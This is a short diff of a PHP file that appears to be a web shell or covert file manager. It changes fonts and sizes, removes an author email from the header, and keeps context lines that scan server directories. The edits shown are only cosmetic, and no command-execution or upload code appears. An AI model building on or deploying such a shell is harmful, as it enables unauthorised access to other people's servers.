@@ -149,14 +149,14 @@ ini_set("max_input_time", 300);
     @import url("https://fonts.googleapis.com/css?family=Carrois+Gothic");
     @import url("https://fonts.googleapis.com/css?family=Bungee+Outline");
 body {
-    font-family: "Dosis", cursive;
+    font-family: Consolas,Menlo,monospace,ui-monospace;
     color: #fff;
     text-shadow:0px 0px 1px #757575;
     background-color: #212529;
     background-size: cover;
     background-attachment: fixed;
     background-repeat: no-repeat;
-    background-size: 9%, 9%;
+    background-size: 8%, 8%;
     background-position: right bottom, left bottom;
 }
 
@@ -187,7 +187,7 @@ tbody td {
   padding: 0.5rem;
   color: #fff;
   font-weight: 400;
-  font-family: "Roboto", "Poppins", sans-serif;
+  font-family: Consolas,Menlo,monospace,ui-monospace;
 }
 tbody td a {
     text-decoration: none;
@@ -688,9 +688,9 @@ $serlok = str_replace("\\", "/", $serlok);
 $serloks = explode("/", $serlok);
 $serlokbos = @scandir($serlok);
 echo '<table class="header"><td><center>
-    <div style="font-family:Bungee Outline;font-size:18px;"><a href="' .
+    <div style="font-family:Bungee Outline;font-size:15px;"><a href="' .
     $_SERVER["SCRIPT_NAME"] .
-    '"><i class="fa-brands fa-napster"></i>xxx0x1998xxx@gmail.com</a></center></div></td><td>';
+    '"><i class="fa-brands fa-napster"></i>0x</a></center></div></td><td>';
 echo '<table align="center"><td>
 <div class="btn-group me-2" role="group" aria-label="First group">
 <button type="button" onclick=location.href="' .
